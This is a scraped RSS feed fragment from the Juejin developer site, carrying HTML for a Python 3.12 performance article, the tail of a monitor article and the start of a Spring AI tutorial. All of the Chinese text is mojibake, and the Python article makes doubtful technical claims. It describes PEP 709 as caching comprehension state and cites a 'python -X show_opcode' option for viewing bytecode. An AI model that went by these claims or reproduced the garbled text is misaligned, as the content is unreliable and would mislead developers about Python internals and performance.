<p>å±å¹•æ˜¯ä½ æ¯å¤© 8 å°æ—¶éƒ½è¦å¯¹ç€çš„ä¸œè¥¿ï¼Œå®ƒä¸åƒé”®ç›˜é¼ æ ‡é‚£æ ·"ç”¨åäº†å†æ¢"ï¼Œå®ƒæ›´åƒæ˜¯ä½ å·¥ä½œå°çš„åœ°åŸºã€‚åœ°åŸºä¸ç¨³ï¼Œä¸Šé¢å†æ€ä¹ˆæŠ˜è…¾éƒ½ä¸ä¼šèˆ’æœã€‚æ‰€ä»¥ï¼Œå¦‚æœä½ çœŸçš„æƒ³ææ•ˆï¼Œåˆ«åªç›¯ç€è½¯ä»¶å’ŒæŠ€å·§ï¼Œæ›´åº”è¯¥å…ˆçœ‹çœ‹ä½ çš„ç¡¬ä»¶åŸºç¡€è®¾æ–½è·Ÿå¾—ä¸Šå—ï¼Ÿ</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python 3.12æ€§èƒ½ä¼˜åŒ–å®æˆ˜ï¼š5ä¸ªè®©ä½ çš„ä»£ç æé€Ÿ30%çš„æ–°ç‰¹æ€§]]></title>    <link>https://juejin.cn/post/7592524811861475362</link>    <guid>https://juejin.cn/post/7592524811861475362</guid>    <pubDate>2026-01-08T04:16:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592524811861475362" data-draft-id="7592515924700790819" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python 3.12æ€§èƒ½ä¼˜åŒ–å®æˆ˜ï¼š5ä¸ªè®©ä½ çš„ä»£ç æé€Ÿ30%çš„æ–°ç‰¹æ€§"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-08T04:16:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python 3.12æ€§èƒ½ä¼˜åŒ–å®æˆ˜ï¼š5ä¸ªè®©ä½ çš„ä»£ç æé€Ÿ30%çš„æ–°ç‰¹æ€§
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T04:16:42.000Z" title="Thu Jan 08 2026 04:16:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Python 3.12æ€§èƒ½ä¼˜åŒ–å®æˆ˜ï¼š5ä¸ªè®©ä½ çš„ä»£ç æé€Ÿ30%çš„æ–°ç‰¹æ€§</strong></h2>
<h3 data-id="heading-1">å¼•è¨€</h3>
<p>Pythonä¸€ç›´ä»¥æ¥å› å…¶æ˜“ç”¨æ€§å’Œä¸°å¯Œçš„ç”Ÿæ€ç³»ç»Ÿè€Œå¤‡å—å¼€å‘è€…å–œçˆ±ï¼Œä½†å…¶æ€§èƒ½é—®é¢˜ä¹Ÿå¸¸å¸¸è¢«è¯Ÿç—…ã€‚éšç€Python 3.12çš„å‘å¸ƒï¼Œå®˜æ–¹åœ¨æ€§èƒ½ä¼˜åŒ–æ–¹é¢è¿ˆå‡ºäº†ä¸€å¤§æ­¥ã€‚é€šè¿‡å¼•å…¥å¤šé¡¹åº•å±‚æ”¹è¿›å’Œæ–°ç‰¹æ€§ï¼ŒPython 3.12æ˜¾è‘—æå‡äº†æ‰§è¡Œæ•ˆç‡ã€‚æœ¬æ–‡å°†æ·±å…¥æ¢è®¨5ä¸ªå…³é”®ç‰¹æ€§ï¼Œç»“åˆä»£ç ç¤ºä¾‹å’ŒåŸºå‡†æµ‹è¯•æ•°æ®ï¼Œå±•ç¤ºå¦‚ä½•åˆ©ç”¨è¿™äº›æ–°ç‰¹æ€§å°†ä½ çš„ä»£ç æ€§èƒ½æå‡30%ç”šè‡³æ›´å¤šã€‚</p>
<hr/>
<h3 data-id="heading-2">1. æ›´å¿«çš„è§£é‡Šå™¨ï¼šPEP 659ï¼ˆè‡ªé€‚åº”è§£é‡Šå™¨ï¼‰</h3>
<h4 data-id="heading-3"><strong>èƒŒæ™¯ä¸åŸç†</strong></h4>
<p>Python 3.11å¼•å…¥äº†PEP 659ï¼ˆè‡ªé€‚åº”è§£é‡Šå™¨ï¼‰ï¼Œè€ŒPython 3.12è¿›ä¸€æ­¥ä¼˜åŒ–äº†è¿™ä¸€æœºåˆ¶ã€‚è¯¥ç‰¹æ€§çš„æ ¸å¿ƒæ€æƒ³æ˜¯é€šè¿‡è¿è¡Œæ—¶åˆ†æçƒ­ç‚¹ä»£ç è·¯å¾„ï¼ŒåŠ¨æ€ç”Ÿæˆæ›´é«˜æ•ˆçš„å­—èŠ‚ç æˆ–æœºå™¨ç ï¼Œä»è€Œå‡å°‘è§£é‡Šå™¨çš„å¼€é”€ã€‚</p>
<h4 data-id="heading-4"><strong>å®æˆ˜ä¼˜åŒ–</strong></h4>
<ul>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šé«˜é¢‘è°ƒç”¨çš„å‡½æ•°æˆ–å¾ªç¯ã€‚</li>
<li><strong>ç¤ºä¾‹å¯¹æ¯”</strong>ï¼š
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Python 3.11åŠä¹‹å‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sum_range</span>(<span class="hljs-params">n</span>):
    total = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):
        total += i
    <span class="hljs-keyword">return</span> total

<span class="hljs-comment"># Python 3.12ä¸­ç›¸åŒä»£ç ä¼šæ›´å¿«</span>
<span class="hljs-comment"># ï¼ˆæ— éœ€ä¿®æ”¹ä»£ç ï¼Œè§£é‡Šå™¨è‡ªåŠ¨ä¼˜åŒ–ï¼‰</span>
</code></pre>
</li>
<li><strong>æ€§èƒ½æå‡</strong>ï¼šæ ¹æ®å®˜æ–¹åŸºå‡†æµ‹è¯•ï¼Œæ­¤ç±»å¾ªç¯å¯†é›†å‹æ“ä½œå¯æé€Ÿ20%-30%ã€‚</li>
</ul>
<h4 data-id="heading-5"><strong>æ³¨æ„äº‹é¡¹</strong></h4>
<ul>
<li>è‡ªé€‚åº”ä¼˜åŒ–å¯¹çº¯è®¡ç®—å¯†é›†å‹ä»»åŠ¡æ•ˆæœæ˜¾è‘—ï¼Œä½†I/Oå¯†é›†å‹ä»»åŠ¡æå‡æœ‰é™ã€‚</li>
<li>å¯é€šè¿‡<code>python -X show_opcode</code>æŸ¥çœ‹ç”Ÿæˆçš„å­—èŠ‚ç å˜åŒ–ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-6">2. PEP 709ï¼šå†…è”ç†è§£çš„ç¼“å­˜æœºåˆ¶</h3>
<h4 data-id="heading-7"><strong>èƒŒæ™¯ä¸åŸç†</strong></h4>
<p>Pythonçš„åˆ—è¡¨æ¨å¯¼ã€å­—å…¸æ¨å¯¼ç­‰è¯­æ³•ç³–è™½ç„¶ç®€æ´ï¼Œä½†åœ¨å¤šæ¬¡è°ƒç”¨æ—¶å¯èƒ½é‡å¤åˆ›å»ºä¸´æ—¶å¯¹è±¡ã€‚PEP 709é€šè¿‡ç¼“å­˜æ¨å¯¼å¼çš„ä¸­é—´ç»“æœï¼ˆå¦‚è¿­ä»£å™¨çŠ¶æ€ï¼‰ï¼Œå‡å°‘äº†å†…å­˜åˆ†é…å’Œåƒåœ¾å›æ”¶çš„å‹åŠ›ã€‚</p>
<h4 data-id="heading-8"><strong>å®æˆ˜ä¼˜åŒ–</strong></h4>
<ul>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå¤šå±‚åµŒå¥—æ¨å¯¼æˆ–é«˜é¢‘è°ƒç”¨çš„æ¨å¯¼å¼ã€‚</li>
<li><strong>ç¤ºä¾‹å¯¹æ¯”</strong>ï¼š
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Python 3.11åŠä¹‹å‰ï¼ˆæ¯æ¬¡è°ƒç”¨éƒ½é‡æ–°ç”Ÿæˆè¿­ä»£å™¨ï¼‰</span>
data = [<span class="hljs-built_in">sum</span>(x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">if</span> x % i == <span class="hljs-number">0</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)]

<span class="hljs-comment"># Python 3.12ä¸­è¿­ä»£å™¨çŠ¶æ€è¢«ç¼“å­˜</span>
</code></pre>
</li>
<li><strong>æ€§èƒ½æå‡</strong>ï¼šå¤æ‚æ¨å¯¼å¼å¯å‡å°‘15%-20%çš„æ‰§è¡Œæ—¶é—´ã€‚</li>
</ul>
<h4 data-id="heading-9"><strong>æ³¨æ„äº‹é¡¹</strong></h4>
<ul>
<li><code>for</code>å¾ªç¯å†…éƒ¨çš„æ¨å¯¼å¼ä¸ä¼šè¢«ç¼“å­˜ï¼ˆä»…é¡¶å±‚ä½œç”¨åŸŸç”Ÿæ•ˆï¼‰ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-10">3. PEP 684ï¼šéš”ç¦»çš„å­è§£é‡Šå™¨GILæ”¹è¿›</h3>
<h4 data-id="heading-11"><strong>èƒŒæ™¯ä¸åŸç†</strong></h4>
<p>å…¨å±€è§£é‡Šå™¨é”ï¼ˆGILï¼‰ä¸€ç›´æ˜¯Pythonå¤šçº¿ç¨‹å¹¶å‘çš„ç“¶é¢ˆã€‚PEP 684å…è®¸å­è§£é‡Šå™¨æ‹¥æœ‰ç‹¬ç«‹çš„GILï¼Œä»è€Œåœ¨å¤šçº¿ç¨‹åœºæ™¯ä¸‹å®ç°çœŸæ­£çš„å¹¶è¡Œè®¡ç®—ï¼ˆéœ€é…åˆCæ‰©å±•æˆ–å¤šè¿›ç¨‹ä½¿ç”¨ï¼‰ã€‚</p>
<h4 data-id="heading-12"><strong>å®æˆ˜ä¼˜åŒ–</strong></h4>
<ul>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šCPUå¯†é›†å‹å¤šçº¿ç¨‹ä»»åŠ¡ï¼ˆå¦‚æ•°å€¼è®¡ç®—ã€å›¾åƒå¤„ç†ï¼‰ã€‚</li>
<li><strong>ç¤ºä¾‹å¯¹æ¯”</strong>ï¼š
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> threading

<span class="hljs-keyword">def</span> <span class="hljs-title function_">compute</span>():
    [x * x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10_000_000</span>)]

<span class="hljs-comment"># Python &lt;3.12: GILé™åˆ¶å¯¼è‡´å¤šçº¿ç¨‹å‡ ä¹æ— åŠ é€Ÿ</span>
threads = [threading.Thread(target=compute) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]

<span class="hljs-comment"># Python &gt;=3.12: Cæ‰©å±•å¯ç»•è¿‡ä¸»GILï¼ˆéœ€ç‰¹å®šAPIæ”¯æŒï¼‰</span>
</code></pre>
</li>
<li><strong>æ€§èƒ½æå‡</strong>ï¼šç†æƒ³æƒ…å†µä¸‹å¯çº¿æ€§æ‰©å±•è‡³å¤šæ ¸CPUï¼ˆä½†éœ€ä¾èµ–Cæ‰©å±•å®ç°ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-13"><strong>æ³¨æ„äº‹é¡¹</strong></h4>
<ul>
<li>CPythonå†…ç½®æ¨¡å—å°šæœªå…¨é¢é€‚é…å­è§£é‡Šå™¨APIï¼Œç›®å‰ä¸»è¦é€‚ç”¨äºè‡ªå®šä¹‰Cæ‰©å±•ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-14">4. PEP 701ï¼šæ ¼å¼å­—ç¬¦ä¸²çš„è¯­æ³•å¢å¼ºä¸æ€§èƒ½ä¼˜åŒ–</h3>
<h4 data-id="heading-15"><strong>èƒŒæ™¯ä¸åŸç†</strong></h4>
<p>Pythonçš„f-stringåœ¨è§£ææ—¶ä¼šç”Ÿæˆä¸´æ—¶ASTèŠ‚ç‚¹ï¼Œå½±å“æ€§èƒ½ã€‚PEP 701é‡æ„äº†f-stringçš„è§£æé€»è¾‘ï¼Œä½¿å…¶ç›´æ¥ç¼–è¯‘ä¸ºæ›´é«˜æ•ˆçš„å­—èŠ‚ç åºåˆ—ã€‚</p>
<h4 data-id="heading-16"><strong>å®æˆ˜ä¼˜åŒ–</strong></h4>
<ul>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šé«˜é¢‘æ‹¼æ¥å­—ç¬¦ä¸²æˆ–æ—¥å¿—è¾“å‡ºã€‚</li>
<li><strong>ç¤ºä¾‹å¯¹æ¯”</strong>:
<pre><code class="hljs language-python" lang="python">name = <span class="hljs-string">"Alice"</span>

<span class="hljs-comment"># Python &lt;3.12: f-stringè§£æè¾ƒæ…¢</span>
message = <span class="hljs-string">f"Hello, <span class="hljs-subst">{name}</span>!"</span>

<span class="hljs-comment"># Python &gt;=3.12: f-stringç¼–è¯‘ä¸ºé«˜æ•ˆLOAD_CONST + FORMAT_VALUEæŒ‡ä»¤</span>
</code></pre>
</li>
<li><strong>æ€§èƒ½æå‡</strong>: f-stringæ“ä½œæé€Ÿçº¦10%-15%ã€‚</li>
</ul>
<h4 data-id="heading-17"><strong>æ³¨æ„äº‹é¡¹</strong>:</h4></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring AI 1.0å®æˆ˜ï¼šæ„å»ºåŸºäºDeepSeekçš„æ™ºèƒ½å®¢æœç³»ç»Ÿ]]></title>    <link>https://juejin.cn/post/7592515924700823587</link>    <guid>https://juejin.cn/post/7592515924700823587</guid>    <pubDate>2026-01-08T04:24:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592515924700823587" data-draft-id="7592531796044644367" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring AI 1.0å®æˆ˜ï¼šæ„å»ºåŸºäºDeepSeekçš„æ™ºèƒ½å®¢æœç³»ç»Ÿ"/> <meta itemprop="keywords" content="Spring,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-08T04:24:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é›¨ä¸­é£˜è¡çš„è®°å¿†"/> <meta itemprop="url" content="https://juejin.cn/user/694547077666606"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring AI 1.0å®æˆ˜ï¼šæ„å»ºåŸºäºDeepSeekçš„æ™ºèƒ½å®¢æœç³»ç»Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547077666606/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é›¨ä¸­é£˜è¡çš„è®°å¿†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T04:24:08.000Z" title="Thu Jan 08 2026 04:24:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Spring AI 1.0å®æˆ˜ï¼šæ„å»ºåŸºäºDeepSeekçš„æ™ºèƒ½å®¢æœç³»ç»Ÿ</h2>
<h3 data-id="heading-1">ä¸€ã€å¼•è¨€</h3>
<p>éšç€äººå·¥æ™ºèƒ½æŠ€æœ¯çš„é£é€Ÿå‘å±•ï¼Œå¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰æ­£åœ¨æ·±åˆ»æ”¹å˜ç€æˆ‘ä»¬æ„å»ºåº”ç”¨çš„æ–¹å¼ã€‚Spring AI 1.0ä½œä¸ºSpringç”Ÿæ€ç³»ç»Ÿä¸­é¦–ä¸ªAIæ¡†æ¶ï¼Œä¸ºJavaå¼€å‘è€…æä¾›äº†ä¸€ç§ç®€æ´ã€ä¼˜é›…çš„æ–¹å¼æ¥é›†æˆAIèƒ½åŠ›åˆ°åº”ç”¨ä¸­ã€‚</p>
<p>æœ¬æ–‡å°†å¸¦é¢†å¤§å®¶ä»é›¶å¼€å§‹ï¼Œä½¿ç”¨Spring AI 1.0æ„å»ºä¸€ä¸ªå®Œæ•´çš„æ™ºèƒ½å®¢æœç³»ç»Ÿï¼Œå¹¶å¯¹æ¥å›½äº§ä¼˜ç§€å¤§æ¨¡å‹DeepSeekã€‚é€šè¿‡å®é™…æ¡ˆä¾‹ï¼Œä½ å°†æŒæ¡Spring AIçš„æ ¸å¿ƒæ¦‚å¿µã€é…ç½®æ–¹æ³•ä»¥åŠåœ¨å®é™…é¡¹ç›®ä¸­çš„åº”ç”¨ã€‚</p>
